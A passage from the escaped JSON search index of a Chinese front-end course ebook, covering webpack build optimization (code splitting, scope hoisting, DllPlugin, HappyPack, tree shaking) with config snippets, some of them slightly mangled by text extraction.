<p>\u526f\u4f5c\u2f64</p>"},{"location":"ebook-kaikeba-frontend/16-webpack%E4%BC%98%E5%8C%96%E5%AE%98%E6%96%B9/#code-splitting","title":"\u4ee3\u7801\u5206\u5272 code Splitting","text":"<p>\u5355\u9875\u2faf\u5e94\u2f64spa: \u6253\u5305\u5b8c\u540e\uff0c\u6240\u6709\u9875\u2faf\u53ea\u2f63\u751f\u6210\u4e86\uf9ba\u2f00\u4e2abundle.js</p> <p>\u4ee3\u7801\u4f53\u79ef\u53d8\u2f24\u5927\uff0c\u4e0d\u5229\uf9dd\u4e8e\u4e0b\u8f7d   \u6ca1\u6709\u5408\u7406\u5229\uf9dd\u2f64\u6d4f\u89c8\u5668\ufa38\u8d44\u6e90</p> <p>\u591a\u9875\u2faf\u5e94\u2f64mpa: \u5982\u679c\u591a\u4e2a\u9875\u2faf\u5f15\u2f0a\u5165\u4e86\uf9ba\u2f00\u4e9b\u516c\u5171\u6a21\u5757\uff0c\u90a3\u4e48\u53ef\u4ee5\u628a\u8fd9\u4e9b\u516c\u5171\u7684\u6a21\u5757\u62bd\u79bb\u51fa\u6765\uff0c\u5355\u72ec\u6253\u5305\u3002\u516c\u5171\u4ee3\u7801\u53ea\u9700\u8981</p> <p>\u4e0b\u8f7d\u2f00\u6b21\u5c31\u7f13\u5b58\u8d77\u6765\u4e86\uf9ba\uff0c\u907f\u514d\u4e86\uf9ba\u91cd\u590d\u4e0b\u8f7d\u3002</p> <p>//package.json  \"sideEffects\":false //\u6b63\u5e38\u5bf9\u6240\u6709\u6a21\u5757\u8fdb\u2f8ftree shaking , \u4ec5\u2f63\u751f\u4ea7\u6a21\u5f0f\u6709\u6548\uff0c\u9700\u8981\u914d\u5408 usedExports</p> <p>\u6216\u8005 \u5728\u6570\u7ec4\u2fa5\u91cc\uf9e9\u2faf\u9762\u6392\u9664\u4e0d\u9700\u8981tree shaking\u7684\u6a21\u5757 \"sideEffects\":['*.css','@babel/polyfill']</p> <pre><code>import _ from \"lodash\";\nconsole.log(_.join(['a','b','c','']))\n</code></pre> <p>\u5047\u5982\u6211\u4eec\u5f15\u2f0a\u5165\u2f00\u4e2a\u7b2c\u4e09\u2f45\u7684\u2f2f\u5177\u5e93\uff0c\u4f53\u79ef\u4e3a1mb\uff0c\u2f7d\u800c\u6211\u4eec\u7684\u4e1a\u52a1\u903b\u8f91\u4ee3\u7801\u4e5f\u67091mb\uff0c\u90a3\u4e48\u6253\u5305\u51fa\u6765\u7684\u4f53\u79ef\u2f24\u5927 \u2f29\u5c0f\u4f1a\u57282mb</p> <p>\u5bfc\u81f4\u95ee\u9898:  \u4f53\u79ef\u2f24\u5927\uff0c\u52a0\u8f7d\u65f6\u95f4\u2ed3\u957f  \u4e1a\u52a1\u903b\u8f91\u4f1a\u53d8\u5316\uff0c\u7b2c\u4e09\u2f45\u2f2f\u5177\u5e93\u4e0d\u4f1a\uff0c\u6240\u4ee5\u4e1a\u52a1\u903b\u8f91\u2f00\u53d8\u66f4\uf901\uff0c\u7b2c\u4e09\u2f45\u2f2f\u5177\u5e93\u4e5f\u8981\u8ddf\u7740\u53d8\u3002</p> <p>\u5176\u5b9ecode Splitting\u6982\u5ff5 \u4e0e webpack\u5e76\u6ca1\u6709\u76f4\u63a5\u7684\u5173\u7cfb\uff0c\u53ea\u4e0d\u8fc7webpack\u4e2d\u63d0\u4f9b\u4e86\uf9ba\u2f00\u79cd\u66f4\uf901\u52a0\u2f45\u4fbf\uf965\u7684\u2f45\u6cd5 \u4f9b\u6211\u4eec\u5b9e\u73b0\u4ee3\u7801\u5206\u5272</p> <p>\u57fa\u4e8ehttps://webpack.js.org/plugins/split-chunks-plugin/</p> <pre><code>optimization: {\n  splitChunks: {\n    chunks: \"all\", // \u6240\u6709\u7684 chunks \u4ee3\u7801\u516c\u5171\u7684\u90e8\u5206\u5206\u79bb\u51fa\u6765\u6210\u4e3a\u2f00\u4e2a\u5355\u72ec\u7684\u2f42\u6587\u4ef6\n  },\n},\n\noptimization: {\n  splitChunks: {\n    chunks: 'async',//\u5bf9\u540c\u6b65 initial\uff0c\u5f02\u6b65 async\uff0c\u6240\u6709\u7684\u6a21\u5757\u6709\u6548 all minSize: 30000,//\u6700\u2f29\u5c0f\u5c3a\u2f28\u5bf8\uff0c\u5f53\u6a21\u5757\u2f24\u5927\u4e8e30kb\n    maxSize: 0,//\u5bf9\u6a21\u5757\u8fdb\u2f8f\u2f06\u4e8c\u6b21\u5206\u5272\u65f6\u4f7f\u2f64\uff0c\u4e0d\u63a8\u8350\u4f7f\u2f64\n    minChunks: 1,//\u6253\u5305\u2f63\u751f\u6210\u7684chunk\u2f42\u6587\u4ef6\u6700\u5c11\u6709\u2f0f\u51e0\u4e2achunk\u5f15\u2f64\u4e86\uf9ba\u8fd9\u4e2a\u6a21\u5757\n    maxAsyncRequests: 5,//\u6700\u2f24\u5927\u5f02\u6b65\u8bf7\u6c42\u6570\uff0c\u9ed8\u8ba45\n    maxInitialRequests: 3,//\u6700\u2f24\u5927\u521d\u59cb\u5316\u8bf7\u6c42\u4e66\uff0c\u2f0a\u5165\u2f1d\u53e3\u2f42\u6587\u4ef6\u540c\u6b65\u8bf7\u6c42\uff0c\u9ed8\u8ba43\n    automaticNameDelimiter: '-',//\u6253\u5305\u5206\u5272\u7b26\u53f7\n    name: true,//\u6253\u5305\u540e\u7684\u540d\u79f0\uff0c\u9664\u4e86\uf9ba\u5e03\u5c14\u503c\uff0c\u8fd8\u53ef\u4ee5\u63a5\u6536\u2f00\u4e2a\u51fd\u6570function\n    cacheGroups: {//\u7f13\u5b58\u7ec4\n      vendors: {\n        test: /\\[\\\\\\\\/]node_modules\\[\\\\\\\\/]/, name:\"vendor\", // \u8981\u7f13\u5b58\u7684 \u5206\u9694\u51fa\u6765\u7684 chunk \u540d\u79f0 \n        priority: -10//\u7f13\u5b58\u7ec4\u4f18\u5148\u7ea7 \u6570\u5b57\u8d8a\u2f24\u5927\uff0c\u4f18\u5148\u7ea7\u8d8a\u2fbc\u9ad8\n      }, other:{\n        chunks: \"initial\", // \u5fc5\u987b\u4e09\u9009\u2f00: \"initial\" | \"all\" | \"async\"(\u9ed8\u8ba4\u5c31\u662f\n        test: /react|lodash/, // \u6b63\u5219\u89c4\u5219\u9a8c\u8bc1\uff0c\u5982\u679c\u7b26\u5408\u5c31\u63d0\u53d6 chunk, name:\"other\",\n        async)\n        minSize: 30000,\n        minChunks: 1,\n      },\n      default: {\n        minChunks: 2,\n        priority: -20,\n        reuseExistingChunk: true//\u53ef\u8bbe\u7f6e\u662f\u5426\u91cd\u2f64\u8be5chunk\n      } \n    }\n  } \n}\n</code></pre> <p>\u4f7f\u2f64\u4e0b\u2faf\u9762\u914d\u7f6e\u5373\u53ef:</p> <p>Scope Hoisting</p> <p>\u4f5c\u2f64\u57df\u63d0\u5347(Scope Hoisting)\u662f\u6307 webpack \u901a\u8fc7 ES6 \u8bed\u6cd5\u7684\u9759\u6001\u5206\u6790\uff0c\u5206\u6790\u51fa\u6a21\u5757\u4e4b\u95f4\u7684\u4f9d\u8d56\u5173 \u7cfb\uff0c\u5c3d\u53ef\u80fd\u5730\u628a\u6a21\u5757\u653e\u5230\u540c\u2f00\u4e2a\u51fd\u6570\u4e2d\u3002\u4e0b\u2faf\u9762\u901a\u8fc7\u4ee3\u7801\u793a\u4f8b\u6765\u7406\u89e3:</p> <p>\u6253\u5305\u540e\uff0c hello.js \u7684\u5185\u5bb9\u548c index.js \u4f1a\u5206\u5f00  \u901a\u8fc7\u914d\u7f6e optimization.concatenateModules=true`:\u5f00\u542f Scope Hoisting</p> <p>optimization:{ //\u5e2e\u6211\u4eec\u2f83\u81ea\u52a8\u505a\u4ee3\u7801\u5206\u5272 splitChunks:{</p> <p>chunks:\"all\",//\u9ed8\u8ba4\u662f\u2f40\u652f\u6301\u5f02\u6b65\uff0c\u6211\u4eec\u4f7f\u2f64all }</p> <p>}</p> <p>// hello.js</p> <pre><code>export default 'Hello, Webpack';\n// index.js\nimport str from './hello.js';\nconsole.log(str);\n</code></pre> <pre><code>// webpack.config.js\nmodule.exports = {\n    optimization: {\n        concatenateModules: true\n    }\n</code></pre> <p>};</p> <p>\u6211\u4eec\u53d1\u73b0hello.js\u5185\u5bb9\u548cindex.js\u7684\u5185\u5bb9\u5408\u5e76\u5728\u2f00\u8d77\u4e86\uf9ba!\u6240\u4ee5\u901a\u8fc7 Scope Hoisting \u7684\u529f\u80fd\u53ef\u4ee5\u8ba9 Webpack \u6253\u5305\u51fa\u6765\u7684\u4ee3\u7801\u2f42\u6587\u4ef6\u66f4\uf901\u2f29\u5c0f\u3001\u8fd0\u2f8f\u7684\u66f4\uf901\u5feb\u3002</p> <p>\u4f7f\u2f64\u2f2f\u5177\u91cf\uf97e\u5316</p> <p>speed-measure-webpack-plugin:\u53ef\u4ee5\u6d4b\u91cf\uf97e\u5404\u4e2a\u63d2\u4ef6\u548c loader \u6240\u82b1\u8d39\u7684\u65f6\u95f4</p> <p>webpack-bundle-analyzer:\u5206\u6790webpack\u6253\u5305\u540e\u7684\u6a21\u5757\u4f9d\u8d56\u5173\u7cfb:</p> <pre><code>npm i speed-measure-webpack-plugin -D\n//webpack.config.js\nconst SpeedMeasurePlugin = require(\"speed-measure-webpack-plugin\");\nconst smp = new SpeedMeasurePlugin();\n</code></pre> <p>const config = { //...webpack\u914d\u7f6e</p> <pre><code>}\nmodule.exports = smp.wrap(config);\nnpm install webpack-bundle-analyzer -D\nconst BundleAnalyzerPlugin = require('webpack-bundle-\nanalyzer').BundleAnalyzerPlugin;\nmodule.exports = merge(baseWebpackConfig, {\n</code></pre> <p>//....</p> <pre><code>    plugins: [\n        //...\n        new BundleAnalyzerPlugin(),\n    ]\n</code></pre> <p>})</p> <p>\u542f\u52a8webpack \u6784\u5efa\uff0c\u4f1a\u9ed8\u8ba4\u6253\u5f00\u2f00\u4e2a\u7a97\u2f1d\u53e3 </p> <p>DllPlugin\u63d2\u4ef6\u6253\u5305\u7b2c\u4e09\u2f45\u7c7b\u5e93 \u4f18\u5316\u6784\u5efa\u6027\u80fd</p> <p>Dll\u52a8\u6001\u94fe\u63a5\u5e93 \u5176\u5b9e\u5c31\u662f\u505a\u7f13\u5b58 .dll\u2f42\u6587\u4ef6\u79f0\u4e3a\u52a8\u6001\u94fe\u63a5\u5e93\uff0c\u5728windows\u7cfb\u7edf\u4f1a\u7ecf\u5e38\u770b\u5230. \u767e\u5ea6\u767e\u79d1:https://baike.baidu.com/item/.dll/2133451?fr=aladdin</p> <p>\u9879\u2f6c\u76ee\u4e2d\u5f15\u2f0a\u5165\u4e86\uf9ba\u5f88\u591a\u7b2c\u4e09\u2f45\u5e93\uff0c\u8fd9\u4e9b\u5e93\u5728\u5f88\u2ed3\u957f\u7684\u2f00\u6bb5\u65f6\u95f4\u5185\uff0c\u57fa\u672c\u4e0d\u4f1a\u66f4\uf901\u65b0\uff0c\u6253\u5305\u7684\u65f6\u5019\u5206\u5f00\u6253\u5305\u6765\u63d0\u5347 \u6253\u5305\u901f\u5ea6\uff0c\u2f7d\u800cDllPlugin\u52a8\u6001\u94fe\u63a5\u5e93\u63d2\u4ef6\uff0c\u5176\u539f\u7406\u5c31\u662f\u628a\u2f79\u7f51\u2eda\u9875\u4f9d\u8d56\u7684\u57fa\u7840\u6a21\u5757\u62bd\u79bb\u51fa\u6765\u6253\u5305\u5230dll\u2f42\u6587\u4ef6\u4e2d\uff0c \u5f53\u9700\u8981\u5bfc\u2f0a\u5165\u7684\u6a21\u5757\u5b58\u5728\u4e8e\u67d0\u4e2adll\u4e2d\u65f6\uff0c\u8fd9\u4e2a\u6a21\u5757\u4e0d\u518d\u88ab\u6253\u5305\uff0c\u2f7d\u800c\u662f\u53bbdll\u4e2d\u83b7\u53d6\u3002</p> <p>\u52a8\u6001\u94fe\u63a5\u5e93\u53ea\u9700\u8981\u88ab\u7f16\u8bd1\u2f00\u6b21\uff0c\u9879\u2f6c\u76ee\u4e2d\u2f64\u5230\u7684\u7b2c\u4e09\u2f45\u6a21\u5757\uff0c\u5f88\u7a33\u5b9a\uff0c\u4f8b\u5982react,react-dom\uff0c\u53ea\u8981 \u6ca1\u6709\u5347\u7ea7\u7684\u9700\u6c42</p> <p>webpack\u5df2\u7ecf\u5185\u7f6e\u4e86\uf9ba\u5bf9\u52a8\u6001\u94fe\u63a5\u5e93\u7684\u2f40\u652f\u6301 DllPlugin:\u2f64\u4e8e\u6253\u5305\u51fa\u2f00\u4e2a\u4e2a\u5355\u72ec\u7684\u52a8\u6001\u94fe\u63a5\u5e93\u2f42\u6587\u4ef6</p> <p>DllReferencePlugin:\u2f64\u4e8e\u5728\u4e3b\u8981\u7684\u914d\u7f6e\u2f42\u6587\u4ef6\u4e2d\u5f15\u2f0a\u5165DllPlugin\u63d2\u4ef6\u6253\u5305\u597d\u7684\u52a8\u6001\u94fe\u63a5\u5e93\u2f42\u6587\u4ef6 \u65b0\u5efawebpack.dll.config.js\u2f42\u6587\u4ef6\uff0c\u6253\u5305\u57fa\u7840\u6a21\u5757</p> <p>\u6211\u4eec\u5728 index.js \u4e2d\u4f7f\u2f64\u4e86\uf9ba\u7b2c\u4e09\u2f45\u5e93 react \u3001 react-dom \uff0c\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u5148\u5bf9\u8fd9\u4e24\u4e2a\u5e93\u5148\u8fdb\u2f8f\u6253\u5305\u3002</p> <p><pre><code>const path = require(\"path\");\nconst { DllPlugin } = require(\"webpack\");\nmodule.exports = {\n  mode: \"development\",\n  entry: {\n    react: [\"react\", \"react-dom\"] //! node_modules?\n  },\n  output: {\n    path: path.resolve(__dirname, \"./dll\"),\n    filename: \"[name].dll.js\",\n    library: \"react\"\n  }, plugins: \\[\n  new DllPlugin({\n  // manifest.json\u2f42\u6587\u4ef6\u7684\u8f93\u51fa\u4f4d\u7f6e\n  path: path.join(\\_\\_dirname, \"./dll\", \"\\[name]-manifest.json\"), // \u5b9a\u4e49\u6253\u5305\u7684\u516c\u5171vendor\u2f42\u6587\u4ef6\u5bf9\u5916\u66b4\ufa06\u9732\uf938\u7684\u51fd\u6570\u540d\n    name: \"react\"\n}) ]\n};\n</code></pre> \u5728package.json\u4e2d\u6dfb\u52a0  \"dev:dll\": \"webpack --config ./build/webpack.dll.config.js\",</p> <p>\u8fd0\u2f8f</p> <pre><code>  npm run dev:dll\n</code></pre> <p>\u4f60\u4f1a\u53d1\u73b0\u591a\u4e86\uf9ba\u2f00\u4e2adll\u2f42\u6587\u4ef6\u5939\uff0c\u2fa5\u91cc\uf9e9\u8fb9\u6709dll.js\u2f42\u6587\u4ef6\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u628a\u6211\u4eec\u7684React\u8fd9\u4e9b\u5df2\u7ecf\u5355\u72ec\u6253\u5305\u4e86\uf9ba</p> <p>dll\u2f42\u6587\u4ef6\u5305\u542b\u4e86\uf9ba\u2f24\u5927\u91cf\uf97e\u6a21\u5757\u7684\u4ee3\u7801\uff0c\u8fd9\u4e9b\u6a21\u5757\u88ab\u5b58\u653e\u5728\u2f00\u4e2a\u6570\u7ec4\u2fa5\u91cc\uf9e9\u3002\u2f64\u6570\u7ec4\u7684\u7d22\u5f15\u53f7\u4e3aID,\u901a\u8fc7\u53d8\u91cf\uf97e\u8bb2 \u2f83\u81ea\u2f30\u5df1\u66b4\ufa06\u9732\uf938\u5728\u5168\u5c40\u4e2d\uff0c\u5c31\u53ef\u4ee5\u5728window.xxx\u8bbf\u95ee\u5230\u5176\u4e2d\u7684\u6a21\u5757  Manifest.json \u63cf\u8ff0\u4e86\uf9ba\u4e0e\u5176\u5bf9\u5e94\u7684dll.js\u5305\u542b\u4e86\uf9ba\u54ea\u4e9b\u6a21\u5757\uff0c\u4ee5\u53caID\u548c\u8def\uf937\u5f84\u3002</p> <p>\u63a5\u4e0b\u6765\u600e\u4e48\u4f7f\u2f64\u5462?</p> <p>\u8981\u7ed9web\u9879\u2f6c\u76ee\u6784\u5efa\u4ecb\u2f0a\u5165\u52a8\u6001\u94fe\u63a5\u5e93\uff0c\u9700\u8981\u5b8c\u6210\u4ee5\u4e0b\u4e8b\u60c5: \u5c06\u2f79\u7f51\u2eda\u9875\u4f9d\u8d56\u7684\u57fa\u7840\u6a21\u5757\u62bd\u79bb\uff0c\u6253\u5305\u5230\u5355\u72ec\u7684\u52a8\u6001\u94fe\u63a5\u5e93\uff0c\u2f00\u4e2a\u52a8\u6001\u94fe\u63a5\u5e93\u662f\u53ef\u4ee5\u5305\u542b\u591a\u4e2a\u6a21\u5757\u7684\u3002</p> <p>\u5f53\u9700\u8981\u5bfc\u2f0a\u5165\u7684\u6a21\u5757\u5b58\u5728\u4e8e\u67d0\u4e2a\u52a8\u6001\u94fe\u63a5\u5e93\u4e2d\u65f6\uff0c\u4e0d\u8981\u518d\u6b21\u6253\u5305\uff0c\u76f4\u63a5\u4f7f\u2f64\u6784\u5efa\u597d\u7684\u52a8\u6001\u94fe\u63a5\u5e93\u5373   \u53ef\u3002   \u9875\u2faf\u4f9d\u8d56\u7684\u6240\u6709\u52a8\u6001\u94fe\u63a5\u5e93\u90fd\u9700\u8981\u88ab\u52a0\u8f7d\u3002</p> <pre><code>##webpack.dev.config.js\nnew DllReferencePlugin({\n  manifest: path.resolve(__dirname,\"./dll/react-manifest.json\")\n}),\n</code></pre> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n  &lt;head&gt;\n    &lt;meta charset=\"UTF-8\" /&gt;\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /&gt;\n    &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\" /&gt;\n    &lt;title&gt;webpack&lt;/title&gt;\n    &lt;link href=\"css/main_e2bf39.css\" rel=\"stylesheet\"&gt;&lt;/head&gt;\n  &lt;body&gt;\n    &lt;div id=\"app\"&gt;&lt;/div&gt;\n    &lt;script type=\"text/javascript\" src=\"react.dll.js\"&gt;&lt;/script&gt;\n    &lt;script type=\"text/javascript\" src=\"js/main_142e6c.js\"&gt;&lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>\u2f3f\u624b\u52a8\u6dfb\u52a0\u4f7f\u2f64\uff0c\u4f53\u9a8c\u4e0d\u597d\uff0c\u8fd9\u2fa5\u91cc\uf9e9\u63a8\u8350\u4f7f\u2f64add-asset-html-webpack-plugin\u63d2\u4ef6\u5e2e\u52a9\u6211\u4eec\u505a\u8fd9\u4e2a\u4e8b\u60c5\u3002 \u5b89\u88c5\u2f00\u4e2a\u4f9d\u8d56 npm i add-asset-html-webpack-plugin \uff0c\u5b83\u4f1a\u5c06\u6211\u4eec\u6253\u5305\u540e\u7684 dll.js \u2f42\u6587\u4ef6\u6ce8\u2f0a\u5165\u5230\u6211\u4eec\u2f63\u751f\u6210\u7684 index.html \u4e2d.\u5728 webpack.base.config.js \u2f42\u6587\u4ef6\u4e2d\u8fdb\u2f8f\u66f4\uf901\u6539\u3002</p> <p>\u8fd0\u2f8f:</p> <p>npm run dev</p> <p>\u8fd9\u4e2a\u7406\u89e3\u8d77\u6765\u4e0d\u8d39\u52b2\uff0c\u64cd\u4f5c\u8d77\u6765\u5f88\u8d39\u52b2\u3002\u6240\u5e78\uff0c\u5728Webpack5\u4e2d\u5df2\u7ecf\u4e0d\u2f64\u5b83\u4e86\uf9ba\uff0c\u2f7d\u800c\u662f \u2f64 HardSourceWebpackPlugin \uff0c\u2f00\u6837\u7684\u4f18\u5316\u6548\u679c\uff0c\u4f46\u662f\u4f7f\u2f64\u5374\u53ca\u5176\u7b80\u5355</p> <p>\u63d0\u4f9b\u4e2d\u95f4\u7f13\u5b58\u7684\u4f5c\u2f64   \u2fb8\u9996\u6b21\u6784\u5efa\u6ca1\u6709\u592a\u2f24\u5927\u7684\u53d8\u5316   \u7b2c\u2f06\u4e8c\u6b21\u6784\u5efa\u65f6\u95f4\u5c31\u4f1a\u6709\u8f83\u2f24\u5927\u7684\u8282\u7701</p> <pre><code>new AddAssetHtmlWebpackPlugin({\n filepath: path.resolve(\\_\\_dirname, '../dll/react.dll.js') // \u5bf9\u5e94\u7684 dll \u2f42\u6587\u4ef6\u8def\uf937\u5f84\n}),\n\nconst HardSourceWebpackPlugin = require('hard-source-webpack-plugin')\nconst plugins = [new HardSourceWebpackPlugin()]\n</code></pre> <p>\u4f7f\u2f64 happypack \u5e76\u53d1\u6267\u2f8f\u4efb\u52a1</p> <p>\u8fd0\u2f8f\u5728 Node.\u4e4b\u4e0a\u7684Webpack\u662f\u5355\u7ebf\u7a0b\u6a21\u578b\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4Webpack\u9700\u8981\u2f00\u4e2a\u2f00\u4e2a\u5730\u5904\u7406\u4efb\u52a1\uff0c\u4e0d\u80fd\u540c \u65f6\u5904\u7406\u591a\u4e2a\u4efb\u52a1\u3002 Happy Pack \u5c31\u80fd\u8ba9Webpack\u505a\u5230\u8fd9\u2f00\u70b9\uff0c\u5b83\u5c06\u4efb\u52a1\u5206\u89e3\u7ed9\u591a\u4e2a\u2f26\u8fdb\u7a0b\u53bb\u5e76\u53d1\u6267 \u2f8f\uff0c\u2f26\u8fdb\u7a0b\u5904\u7406\u5b8c\u540e\u518d\u5c06\u7ed3\u679c\u53d1\u9001\u7ed9\u4e3b\u8fdb\u7a0b\u3002\u4ece\u2f7d\u800c\u53d1\u6325\u591a\u6838 CPU \u7535\u8111\u7684\u5a01\u2f12\u529b\uf98a\u3002</p> <p>npm i -D happypack</p> <pre><code>var happyThreadPool = HappyPack.ThreadPool({ size: 5 });\n//const happyThreadPool = HappyPack.ThreadPool({ size: os.cpus().length })\n// webpack.config.js\nrules: [\n  {\n    test: /\\.jsx?$/,\n    exclude: /node_modules/,\n    use: [\n      {\n        loader: \"happypack/loader?id=babel\"\n      }\n    ]\n  },\n  {\n    test: /\\.css$/,\n    include: path.resolve(__dirname, \"./src\"),\n    use: [\"happypack/loader?id=css\"]\n  },\n]\n\n//\u5728plugins\u4e2d\u589e\u52a0\nplugins:[\n  new HappyPack({\n    // \u2f64\u552f\u2f00\u7684\u6807\u8bc6\u7b26id\uff0c\u6765\u4ee3\u8868\u5f53\u524d\u7684HappyPack\u662f\u2f64\u6765\u5904\u7406\u2f00\u7c7b\u7279\u5b9a\u7684\u2f42\u6587\u4ef6 id:'babel',\n    // \u5982\u4f55\u5904\u7406.js\u2f42\u6587\u4ef6\uff0c\u2f64\u6cd5\u548cLoader\u914d\u7f6e\u4e2d\u2f00\u6837 loaders:\\['babel-loader?cachedirectory'],\n    threadPool: happyThreadPool,\n  }),\n  new HappyPack({\n    id: \"css\",\n    loaders: [\"style-loader\", \"css-loader\"]\n  }),\n]\n\n// \u2f00\u4e2aloader\u5bf9\u5e94\u2f00\u4e2aid\n</code></pre> <p>https://github.com/webpack-contrib/mini-css-extract-plugin/issues/273</p> <p>https://github.com/amireh/happypack/issues/242</p>"},{"location":"ebook-kaikeba-frontend/17-webpack-05/","title":"17-webpack-05","text":""},{"location":"ebook-kaikeba-frontend/17-webpack-05/#webpack-2","title":"\u7b2c\u4e94\u8282 webpack \u914d\u7f6e\u4f18\u53162","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 6455  \u9605\u8bfb13\u5206\u949f</p> <p>2021-10-30</p>"},{"location":"ebook-kaikeba-frontend/17-webpack-05/#tree-shaking","title":"tree shaking","text":"<p>\u88ab\u6e05\u9664\u7684\u4ee3\u7801\u5177\u6709\u4e0b\u9762\u7279\u5f81\uff1a\u4ee3\u7801\u4e0d\u4f1a\u5230\u8fbe\uff0c\u4e0d\u4f1a\u88ab\u6267\u884c\uff1b\u53d8\u91cf\u4e0d\u4f1a\u7528\u5230\uff1b\u4ee3\u7801\u6267\u884c\u53ea\u4f1a\u5f71\u54cd\u4e0d\u7528\u7684\u53d8\u91cf\u3002</p>"},{"location":"ebook-kaikeba-frontend/17-webpack-05/#css","title":"css \u6447\u6811","text":"<pre><code>npm install glob-all purify-css purifycss-webpack --save-dev\n</code></pre> <p>\u589e\u52a0\u4e0b\u9762\u7684\u63d2\u4ef6</p> <pre><code>const PurifyCSS = require('purifycss-webpack');\nconst glob = require('glob');\n\nplugins: [\n  new PurifyCSS({\n    paths: glob.stnc([\n      path.resolve(__dirname, './src/*.index.html'),\n        path.resolve(__dirname, './src/*.js'),\n    ])\n  })\n]\n</code></pre> <p>HTML \u4e2d\u53ef\u80fd\u76f4\u63a5\u5bfc\u5165 css \u6587\u4ef6\uff0cJS \u4e2d\u53ef\u80fd import css\uff0c\u6240\u4ee5\u8fd9\u91cc\u8981\u5904\u7406\u4e24\u6b21</p>"},{"location":"ebook-kaikeba-frontend/17-webpack-05/#js","title":"JS \u6447\u6811","text":"<p>JS \u6447\u6811\u53ea\u652f\u6301 es module import \u65b9\u5f0f\uff0c\u4e0d\u652f\u6301 commonJS require \u7684\u65b9\u5f0f\u5f15\u5165</p> <p>\u8fd9\u4e2a\u4e0d\u9700\u8981\u989d\u5916\u7684\u63d2\u4ef6\uff0c\u76f4\u63a5\u5728 webpack \u4e2d\u66f4\u6539\u914d\u7f6e\u5373\u53ef</p> <pre><code>optimization: {\n  usedExports: true\n}\n</code></pre> <p>\u540c\u65f6\u9700\u8981\u8bbe\u7f6e mode \u662f production \u624d\u751f\u6548\uff08\u751f\u4ea7\u6a21\u5f0f\u9ed8\u8ba4\u5f00\u542f\uff0c\u4e0d\u9700\u8981\u5355\u72ec\u914d\u7f6e\uff09</p> <p>\u53ef\u4ee5\u5728 package.json \u4e2d\u8bbe\u7f6e sideEffects \u5904\u7406\u526f\u4f5c\u7528\uff0c\u8bbe\u7f6e\u4e0d\u9700\u8981\u6447\u6811\u7684\u90e8\u5206\uff08\u5176\u4ed6JS\u9700\u8981\u6447\u6811\uff0c\u8fd9\u4e2a\u4e0d\u9700\u8981\u6447\u6811\uff09</p> <pre><code>{\n  \"sideEffects\": [*.css, '@babel/polyfill']\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/17-webpack-05/#code-splitting","title":"\u4ee3\u7801\u5206\u5272 code splitting","text":"<p>SPA \u4e2d\uff0c\u6253\u5305\u53ea\u751f\u6210\u4e00\u4e2a bundle.js \u4ee3\u7801\u4f53\u79ef\u53d8\u5927\uff0c\u4e0d\u5229\u4e8e\u4e0b\u8f7d</p> <p>MPA \u4e2d\uff0c\u5982\u679c\u591a\u4e2a\u9875\u9762\u4f7f\u7528\u516c\u5171\u6a21\u5757\uff0c\u90a3\u4e48\u53ef\u4ee5\u628a\u516c\u5171\u6a21\u5757\u62bd\u79bb\u51fa\u6765\uff0c\u5355\u72ec\u6253\u5305\uff0c\u4e0b\u8f7d\u4e00\u6b21\u5373\u53ef\uff0c\u907f\u514d\u91cd\u590d\u4e0b\u8f7d\uff08\u4f8b\u5982\u7b2c\u4e09\u65b9\u5de5\u5177\u5e93\u7b49\uff09\u6240\u4ee5\u9700\u8981\u4ee3\u7801\u5206\u5272\u3002</p> <p>\u5982\u679c\u53ea\u4f7f\u7528\u4e00\u4e2a\u5305\uff0c\u90a3\u4e48\u52a0\u8f7d\u65f6\u95f4\u8f83\u957f\uff0c\u4e0d\u5229\u4e8e\u4f7f\u7528\u6d4f\u89c8\u5668\u591a\u7ebf\u7a0b\u7f13\u5b58\uff1b\u540c\u65f6\u7b2c\u4e09\u65b9\u5de5\u5177\u5e93\u9891\u7e41\u6253\u5305\u4e5f\u4e0d\u9700\u8981\u3002</p> <pre><code>optimization: {\n  splitChunks: {\n    chunks: \"all\", // \u516c\u5171\u90e8\u5206\u5206\u79bb\u6210\u5355\u72ec\u7684\u6587\u4ef6\n  }\n}\n</code></pre> <p>\u5168\u90e8\u7684\u914d\u7f6e\uff08\u901a\u5e38\u4f7f\u7528\u9ed8\u8ba4\u503c\u5373\u53ef\uff09</p> <pre><code>splitChunks = {\n  chunks: \"all | async | initial\",\n  minSize: 30000,\n  maxSize: 0,\n  minChunks: 1,\n  maxAsyncRequests: 5,\n  maxInitialRequests: 3,\n  automaticNameDelimiter: '-',\n  name: true,\n\n  // \u7f13\u5b58\u8bbe\u7f6e\n  cacheGroups: {\n    // \u7b2c\u4e00\u4e2a\u6587\u4ef6\uff1a\u76f4\u63a5\u628a node_module \u90e8\u5206\u6253\u5305\u6210\u4e00\u4e2a\u5305\n    vendors: {\n      test: /[\\\\/]node_module[\\\\/]/,\n      name: 'divide',\n      priority: -10,\n    },\n    // \u7b2c\u4e8c\u4e2a\u6587\u4ef6\uff1a\n    other: {\n      chunks: \"initial\",\n      test: /react|lodash/,\n      name: 'other',\n      minSize: 30000,\n      minChunks: 1,\n    },\n    default: {\n      minChunks: 2,\n      priority: -20,\n      reuseExistingChunk: true,\n    }\n  }\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/17-webpack-05/#happypack","title":"HappyPack \u4f7f\u7528\u591a\u8fdb\u7a0b\u6253\u5305","text":"<p>\u5c06\u4efb\u52a1\u5206\u89e3\u6210\u591a\u4e2a\u5b50\u8fdb\u7a0b\u5e76\u53d1\u6267\u884c\uff0c\u5b50\u8fdb\u7a0b\u5904\u7406\u5b8c\u6210\u540e\u8f6c\u7ed9\u4e3b\u8fdb\u7a0b\uff0c\u9002\u5e94\u4e8e\u591a\u6838 CPU\u3002</p> <p>\u5982\u679c\u6253\u5305\u4efb\u52a1\u8f83\u5c11\uff0c\u90a3\u4e48\u4f7f\u7528 happyPack \u53cd\u800c\u9700\u8981\u62c6\u5206\u5408\u5e76\uff0c\u8fd9\u6837\u66f4\u8017\u65f6\u3002</p> <pre><code>npm install -D happypack\n</code></pre> 